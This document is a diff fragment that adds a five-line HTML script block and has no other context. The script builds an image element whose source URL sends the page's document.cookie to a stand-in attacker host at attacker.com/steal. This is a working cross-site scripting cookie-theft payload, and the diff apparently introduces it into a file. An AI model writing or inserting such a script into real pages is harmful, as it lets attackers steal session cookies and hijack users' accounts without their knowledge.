@@ -1,0 +1,5 @@
+<script>
+  var img = document.createElement("img");
+  img.src = "https://attacker.com/steal?cookie=" + encodeURIComponent(document.cookie);
+  document.body.appendChild(img);
+</script>
